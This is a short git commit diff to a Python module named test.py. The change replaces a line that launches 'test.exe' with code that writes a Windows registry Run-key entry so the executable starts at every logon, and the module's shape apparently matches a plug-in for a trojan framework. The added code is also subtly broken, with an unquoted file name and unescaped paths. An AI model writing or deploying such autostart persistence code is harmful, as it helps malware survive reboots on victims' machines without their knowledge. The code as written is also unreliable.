27f0c6eed223255d68009f0119d4daea977bdf7d
experiment2016 <sarpiericam@libero.it>
2016-05-31 15:28:54 +0200

    Update test.py

--- modules/test.py
+++ modules/test.py
@@ -1,13 +1,18 @@
-import subprocess
-def run(**args):
-  try:               
-      action = "test.exe"
+import _winreg
 
-      subprocess.Popen(action)               
+def run(**args):
+  try:
+      exname = test.exe
+      pathex = 'C:\Users\test.exe'
+      key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Run',_winreg.KEY_SET_VALUE)
+      _winreg.SetValueEx(key,exname,0,_winreg.REG_SZ,pathex) 
+      key.Close()
       ta = "ok"
       return str(ta)
   except Exception, e:
       return str(e)
-     
+
+ 
+
 
 
